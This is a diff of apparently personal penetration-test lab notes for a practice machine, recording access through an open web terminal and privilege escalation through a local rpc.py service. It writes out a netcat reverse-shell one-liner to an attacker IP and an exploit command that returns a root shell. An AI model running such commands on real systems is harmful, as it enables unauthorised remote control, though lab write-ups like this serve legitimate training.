@@ -7,8 +7,7 @@
 
 Main Objectives:
 
-Local.txt = 
-Proof.txt = 
+Proof.txt = 22c09cc197348beacaada0d20a6e0746
 
 **Enumeration**
 
@@ -103,7 +102,7 @@ curl -i http://target
 1. Exploit Steps
 
 ```
-
+Simply went to http://192.168.219.210:8000/ a received web based ttyd terminal. 
 
 
 ```
@@ -111,21 +110,9 @@ curl -i http://target
 2. Shell Upgrade
 
 ```
-python3 -c 'import pty; pty.spawn("/bin/bash")'
+Sent reverse shell for normalized shell. 
 
-python -c 'import pty; pty.spawn("/bin/bash")'
-
-/usr/bin/script -qc /bin/bash /dev/null
-
-export TERM=xterm
-
-export SHELL=/bin/bash
-
-Ctrl+Z
-
-stty raw -echo; fg
-
-reset
+user@pc:/home/user$ mkfifo /tmp/f; nc 192.168.45.215 443 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 ```
 
 **Post-Exploitation**
@@ -694,6 +681,12 @@ AdminIdentities=unix-group:sudo;unix-group:admin
 11. Possible PE Paths
 
 ```
+tcp        LISTEN      0           2048                 127.0.0.1:65432 
+
+/opt/rpc.py
+
+https://www.exploit-db.com/exploits/50983
+https://github.com/ehtec/rpcpy-exploit/?source=post_page-----709c76690c30---------------------------------------
 
 ```
 
@@ -701,9 +694,26 @@ AdminIdentities=unix-group:sudo;unix-group:admin
 
 1. PE Steps
 
-```
+- Looks like rpc.py is running in a container based on information in /opt directory and open port listening on 127.0.0.1:65432
+
+- Downloaded exploit at https://github.com/ehtec/rpcpy-exploit/?source=post_page-----709c76690c30---------------------------------------
+
+- Copied exploit to victim machine. 
+
+![[Pasted image 20260314163120.png]]
+
+- Ran exploit. 
 
 ```
+python3 rpc-rce.py --lhost 192.168.45.215 --lport 4321 --target http://127.0.0.1:65432/sayhi
+
+```
+
+![[Pasted image 20260314163207.png]]
+
+- Received reverse shell as root. 
+
+![[Pasted image 20260314163243.png]]
 
 2. Notes
 
